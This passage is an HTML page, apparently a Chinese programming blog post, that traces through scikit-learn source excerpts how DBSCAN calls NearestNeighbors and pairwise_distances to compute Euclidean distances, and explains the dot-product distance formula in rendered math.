@@ -1,0 +1,1480 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>浅谈sklearn中DBSCAN的欧式距离(Euclidean Distance)的计算 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">浅谈sklearn中DBSCAN的欧式距离(Euclidean Distance)的计算</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <p>DBSCAN根据密度聚类，常用欧式距离（Euclidean Distance）来度量数据之间的距离。笔者学习发现DBSCAN中欧式距离的计算先后调用了sklearn.neighbors.NearestNeighbors和sklearn.metrics.pairwise.euclidean_distances，并浅谈其中sklearn.metrics.pairwise.euclidean_distances对欧式距离计算公式的优化和不足。</p> 
+<h2>
+<a id="1_sklearnclusterDBSCAN_2"></a>1 sklearn.cluster.DBSCAN</h2> 
+<blockquote> 
+ <p>class sklearn.cluster.DBSCAN(eps=0.5, *, min_samples=5, metric=‘euclidean’, metric_params=None, algorithm=‘auto’, leaf_size=30, p=None, n_jobs=None)<br> 该类的方法包括fit(X, y=None, sample_weight=None)等</p> 
+</blockquote> 
+<p>实例化该类时，默认metric=‘euclidean’，即欧式距离。从源码可以看到，DBSCAN调用sklearn.neighbors.NearestNeighbors计算数据间的距离并与eps进行对比。</p> 
+<pre><code class="prism language-python"><span class="token comment"># 节选自Libsite-packagessklearncluster_dbscan.py</span>
+<span class="token keyword">class</span> <span class="token class-name">DBSCAN</span><span class="token punctuation">(</span>ClusterMixin<span class="token punctuation">,</span> BaseEstimator<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">fit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> X<span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> sample_weight<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		neighbors_model <span class="token operator">=</span> NearestNeighbors<span class="token punctuation">(</span>radius<span class="token operator">=</span>self<span class="token punctuation">.</span>eps<span class="token punctuation">,</span> algorithm<span class="token operator">=</span>self<span class="token punctuation">.</span>algorithm<span class="token punctuation">,</span> leaf_size<span class="token operator">=</span>self<span class="token punctuation">.</span>leaf_size<span class="token punctuation">,</span> metric<span class="token operator">=</span>self<span class="token punctuation">.</span>metric<span class="token punctuation">,</span> metric_params<span class="token operator">=</span>self<span class="token punctuation">.</span>metric_params<span class="token punctuation">,</span> p<span class="token operator">=</span>self<span class="token punctuation">.</span>p<span class="token punctuation">,</span> n_jobs<span class="token operator">=</span>self<span class="token punctuation">.</span>n_jobs<span class="token punctuation">)</span>
+		neighbors_model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>X<span class="token punctuation">)</span>
+        <span class="token comment"># This has worst case O(n^2) memory complexity</span>
+        neighborhoods <span class="token operator">=</span> neighbors_model<span class="token punctuation">.</span>radius_neighbors<span class="token punctuation">(</span>X<span class="token punctuation">,</span> return_distance<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre> 
+<p>从上述节选的源码可见，DBSCAN先是实例化了NearestNeighbors类，调用fit()方法拟合训练数据集X，再通过radius_neighbors()查找给定半径eps内的所有邻点。<br>  </p> 
+<h2>
+<a id="2_sklearnneighborsNearestNeighbors_22"></a>2 sklearn.neighbors.NearestNeighbors</h2> 
+<blockquote> 
+ <p>class sklearn.neighbors.NearestNeighbors(*, n_neighbors=5, radius=1.0, algorithm=‘auto’, leaf_size=30, metric=‘minkowski’, p=2, metric_params=None, n_jobs=None)<br> 该类的方法包括fit(X, y=None), radius_neighbors(X=None, radius=None, return_distance=True, sort_results=False)等</p> 
+</blockquote> 
+<p>当metric=‘euclidean’, p=None时（同sklearn.cluster.DBSCAN类构建函数的默认参数），DBSCAN实例.radius_neighbors()实际调取sklearn.metrics.pairwise中的pairwise_distances_chunked函数（详见 3 sklearn.metrics.pairwise.euclidean_distances）</p> 
+<pre><code class="prism language-python"><span class="token comment"># 节选自Libsite-packagessklearnneighbors_unsupervised.py</span>
+<span class="token keyword">from</span> <span class="token punctuation">.</span>_base <span class="token keyword">import</span> NeighborsBase
+<span class="token keyword">from</span> <span class="token punctuation">.</span>_base <span class="token keyword">import</span> KNeighborsMixin
+<span class="token keyword">from</span> <span class="token punctuation">.</span>_base <span class="token keyword">import</span> RadiusNeighborsMixin
+<span class="token keyword">class</span> <span class="token class-name">NearestNeighbors</span><span class="token punctuation">(</span>KNeighborsMixin<span class="token punctuation">,</span> RadiusNeighborsMixin<span class="token punctuation">,</span> NeighborsBase<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">fit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> X<span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> self<span class="token punctuation">.</span>_fit<span class="token punctuation">(</span>X<span class="token punctuation">)</span>
+		
+<span class="token comment"># 节选自Libsite-packagessklearnneighbors_base.py</span>
+<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>metrics <span class="token keyword">import</span> pairwise_distances_chunked
+<span class="token keyword">class</span> <span class="token class-name">NeighborsBase</span><span class="token punctuation">(</span>MultiOutputMixin<span class="token punctuation">,</span> BaseEstimator<span class="token punctuation">,</span> metaclass<span class="token operator">=</span>ABCMeta<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">_fit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> X<span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		self<span class="token punctuation">.</span>effective_metric_ <span class="token operator">=</span> self<span class="token punctuation">.</span>metric
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		self<span class="token punctuation">.</span>_fit_X <span class="token operator">=</span> X
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		<span class="token keyword">return</span> self
+		
+<span class="token keyword">class</span> <span class="token class-name">RadiusNeighborsMixin</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">radius_neighbors</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> X<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> return_distance<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sort_results<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>_fit_method <span class="token operator">==</span> <span class="token string">'brute'</span><span class="token punctuation">:</span>
+            <span class="token comment"># for efficiency, use squared euclidean distances</span>
+            <span class="token keyword">if</span> self<span class="token punctuation">.</span>effective_metric_ <span class="token operator">==</span> <span class="token string">'euclidean'</span><span class="token punctuation">:</span>
+                radius <span class="token operator">*=</span> radius
+                kwds <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'squared'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                kwds <span class="token operator">=</span> self<span class="token punctuation">.</span>effective_metric_params_
+            reduce_func <span class="token operator">=</span> partial<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_radius_neighbors_reduce_func<span class="token punctuation">,</span> radius<span class="token operator">=</span>radius<span class="token punctuation">,</span> return_distance<span class="token operator">=</span>return_distance<span class="token punctuation">)</span>
+            chunked_results <span class="token operator">=</span> pairwise_distances_chunked<span class="token punctuation">(</span>X<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_fit_X<span class="token punctuation">,</span> reduce_func<span class="token operator">=</span>reduce_func<span class="token punctuation">,</span> metric<span class="token operator">=</span>self<span class="token punctuation">.</span>effective_metric_<span class="token punctuation">,</span> n_jobs<span class="token operator">=</span>self<span class="token punctuation">.</span>n_jobs<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre> 
+<p> </p> 
+<h2>
+<a id="3_sklearnmetricspairwise_64"></a>3 sklearn.metrics.pairwise</h2> 
+<p>由第二节可见，DBSCAN执行的radius_neighbors()实际调用sklearn.metrics.pairwise中的pairwise_distances_chunked()函数。而当metric='euclidean’时，最终计算欧式距离用的是euclidean_distances()函数。对该函数的计算详见第4节。</p> 
+<pre><code class="prism language-python"><span class="token comment"># 节选自Libsite-packagessklearnmetircspairwise.py</span>
+<span class="token keyword">def</span> <span class="token function">pairwise_distances_chunked</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> reduce_func<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> metric<span class="token operator">=</span><span class="token string">'euclidean'</span><span class="token punctuation">,</span> n_jobs<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> working_memory<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">for</span> sl <span class="token keyword">in</span> slices<span class="token punctuation">:</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        D_chunk <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>X_chunk<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> metric<span class="token operator">=</span>metric<span class="token punctuation">,</span> n_jobs<span class="token operator">=</span>n_jobs<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>X <span class="token keyword">is</span> Y <span class="token keyword">or</span> Y <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+                <span class="token keyword">and</span> PAIRWISE_DISTANCE_FUNCTIONS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>metric<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+                <span class="token keyword">is</span> euclidean_distances<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># zeroing diagonal, taking care of aliases of "euclidean",</span>
+            <span class="token comment"># i.e. "l2"</span>
+            D_chunk<span class="token punctuation">.</span>flat<span class="token punctuation">[</span>sl<span class="token punctuation">.</span>start<span class="token punctuation">:</span><span class="token punctuation">:</span>_num_samples<span class="token punctuation">(</span>X<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">yield</span> D_chunk
+    
+<span class="token keyword">def</span> <span class="token function">pairwise_distances</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> metric<span class="token operator">=</span><span class="token string">"euclidean"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> n_jobs<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> force_all_finite<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	 <span class="token keyword">elif</span> metric <span class="token keyword">in</span> PAIRWISE_DISTANCE_FUNCTIONS<span class="token punctuation">:</span>
+        func <span class="token operator">=</span> PAIRWISE_DISTANCE_FUNCTIONS<span class="token punctuation">[</span>metric<span class="token punctuation">]</span>
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">return</span> _parallel_pairwise<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> func<span class="token punctuation">,</span> n_jobs<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span>
+
+PAIRWISE_DISTANCE_FUNCTIONS <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">'euclidean'</span><span class="token punctuation">:</span> euclidean_distances<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token comment"># 字典, value对应函数</span>
+
+<span class="token keyword">def</span> <span class="token function">_parallel_pairwise</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> func<span class="token punctuation">,</span> n_jobs<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">if</span> Y <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        Y <span class="token operator">=</span> X
+    X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> dtype <span class="token operator">=</span> _return_float_dtype<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> effective_n_jobs<span class="token punctuation">(</span>n_jobs<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> func<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span>  <span class="token comment"># 这里func为euclidean_distances</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+<span class="token keyword">def</span> <span class="token function">euclidean_distances</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> Y_norm_squared<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> squared<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> X_norm_squared<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">#具体见4 sklearn.metrics.pairwise.euclidean_distances</span>
+</code></pre> 
+<h2>
+<a id="4_sklearnmetricspairwiseeuclidean_distances_103"></a>4 sklearn.metrics.pairwise.euclidean_distances</h2> 
+<blockquote> 
+ <p>sklearn.metrics.pairwise.euclidean_distances(X, Y=None, *, Y_norm_squared=None, squared=False, X_norm_squared=None)</p> 
+</blockquote> 
+<p>euclidean_distances是一个函数，输入向量数组X和Y， 计算向量数组X和Y每对（行）向量之间的欧式距离，返回距离矩阵。若仅输入X而Y=None（相当于Y=X），则返回X自身向量间的邻接矩阵。根据官方文档，每对向量x和y的欧式距离计算公式为：</p> 
+<blockquote> 
+ <p>dist(x, y) = sqrt(dot(x, x) - 2 * dot(x, y) + dot(y, y))</p> 
+</blockquote> 
+<p>以二维平面的两个数据点<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        a
+       
+       
+        =
+       
+       
+        
+         [
+        
+        
+         
+          
+           
+            
+             
+              x
+             
+             
+              a
+             
+            
+           
+          
+         
+         
+          
+           
+            
+             
+              y
+             
+             
+              a
+             
+            
+           
+          
+         
+        
+        
+         ]
+        
+       
+      
+      
+       a=begin{bmatrix}x_a\y_aend{bmatrix}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.40003em;vertical-align: -0.95003em"></span><span class="minner"><span class="mopen delimcenter"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.45em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.95em"><span class=""></span></span></span></span></span></span></span><span class="mclose delimcenter"><span class="delimsizing size3">]</span></span></span></span></span></span></span>, <span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        b
+       
+       
+        =
+       
+       
+        
+         [
+        
+        
+         
+          
+           
+            
+             
+              x
+             
+             
+              b
+             
+            
+           
+          
+         
+         
+          
+           
+            
+             
+              y
+             
+             
+              b
+             
+            
+           
+          
+         
+        
+        
+         ]
+        
+       
+      
+      
+       b=begin{bmatrix}x_b\y_bend{bmatrix}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.40003em;vertical-align: -0.95003em"></span><span class="minner"><span class="mopen delimcenter"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.45em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.95em"><span class=""></span></span></span></span></span></span></span><span class="mclose delimcenter"><span class="delimsizing size3">]</span></span></span></span></span></span></span>为例。<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        d
+       
+       
+        o
+       
+       
+        t
+       
+       
+        (
+       
+       
+        a
+       
+       
+        ,
+       
+       
+        a
+       
+       
+        )
+       
+       
+        =
+       
+       
+        
+         x
+        
+        
+         a
+        
+        
+         2
+        
+       
+       
+        +
+       
+       
+        
+         y
+        
+        
+         a
+        
+        
+         2
+        
+       
+      
+      
+       dot(a, a) = x_a^2+y_a^2
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.06111em;vertical-align: -0.247em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1.06111em;vertical-align: -0.247em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em"><span class=""></span></span></span></span></span></span></span></span></span></span>，<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        d
+       
+       
+        o
+       
+       
+        t
+       
+       
+        (
+       
+       
+        a
+       
+       
+        ,
+       
+       
+        b
+       
+       
+        )
+       
+       
+        =
+       
+       
+        
+         
+          x
+         
+         
+          a
+         
+        
+        
+         
+          x
+         
+         
+          b
+         
+        
+       
+       
+        +
+       
+       
+        
+         
+          y
+         
+         
+          a
+         
+        
+        
+         
+          y
+         
+         
+          b
+         
+        
+       
+      
+      
+       dot(a, b) = {x_ax_b}+{y_ay_b}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.73333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 0.625em;vertical-align: -0.19444em"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        d
+       
+       
+        o
+       
+       
+        t
+       
+       
+        (
+       
+       
+        b
+       
+       
+        ,
+       
+       
+        b
+       
+       
+        )
+       
+       
+        =
+       
+       
+        
+         x
+        
+        
+         b
+        
+        
+         2
+        
+       
+       
+        +
+       
+       
+        
+         y
+        
+        
+         b
+        
+        
+         2
+        
+       
+      
+      
+       dot(b, b) = x_b^2+y_b^2
+      
+     
